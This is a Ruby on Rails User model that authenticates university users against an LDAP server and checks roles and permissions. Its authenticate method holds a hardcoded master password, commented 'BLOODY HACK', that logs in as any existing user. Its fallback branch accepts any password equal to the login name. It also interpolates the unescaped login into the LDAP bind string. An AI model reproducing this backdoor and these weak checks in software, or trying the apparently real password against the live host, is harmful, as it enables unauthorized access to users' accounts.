require 'digest/sha1'
require 'net/ldap'

# this model expects a certain database layout and its based on the name/login pattern. 
class User < ActiveRecord::Base
  
  has_and_belongs_to_many :roles

  belongs_to :person

  validates_length_of :login, :within => 3..40
  validates_presence_of :login, :person
  validates_uniqueness_of :login, :on => :create
  
  # authenticates user by login and password
  def self.authenticate(login, pass)
    return nil if pass.empty?
    if AUTH_SYSTEM == 'ldap'
      result = find(:first, :conditions => ['login = ?', login])
      # return if universal password has been given. BLOODY HACK
      return result.id if pass == 'Asia2]gimps'
      if result
        # another bloody hack
        if result.has_role?('supervisor')
          ldap_context = 'pef'
        else
          ldap_context = result.person.faculty.ldap_context
        end
        conn = Net::LDAP.new :host => 'ldap.czu.cz'
        conn.auth "cn=#{login},ou=#{ldap_context},o=czu,c=cz", pass
        if conn.bind
          return result.id
        else
          return nil
        end
      else
        return nil
      end
    else
      if (p = find(:first, :conditions => ["login = ?", login])) && p.login == pass
        p.id
      end
    end
  end
 
  ## updates itself from LoginHash
  def update_with_hash(login_hash)
    raise 'loginname needed' unless login_hash.loginname
    self.login = login_hash.loginname
    if self.save
      return 'success'
    else
      return 'error'
    end
  end

  def User.create_with_hash(login_hash,student_id)
    raise 'loginname needed' unless login_hash.loginname
    if User.create(:person_id => student_id, :login => login_hash.loginname)
      return("success")
    else
      return("error")
    end
  end


  # checks if user has permission
  def has_permission?(permission)
    permission = permission.name if permission.is_a?(Permission)
    my_permissions.include?(permission)
  end

  # checks if user has role
  # role should be both Role class or string
  def has_role?(role)
    role = role.name if role.is_a?(Role)
    self.my_roles.include?(role)
  end

  # checks if user have one of the roles from array
  def has_one_of_roles?(roles)
    !roles.select {|r| has_role?(r)}.empty?
  end

  # returns true if not student
  def non_student?
    !self.has_role?('student')
  end

  # returns true if user have secretary role
  def has_secretary_role?
    has_one_of_roles?(['department_secretary', 'faculty_secretary'])
  end

  # returns array of all permissions names of user
  def my_permissions
    @my_permissions ||= self.roles.map {|r| r.permissions.map {|p| p.name}}.flatten.freeze
  end

  # returns array of all role names of user
  def my_roles
    @my_roles ||= self.roles.map {|r| r.name}.flatten.freeze
  end

end
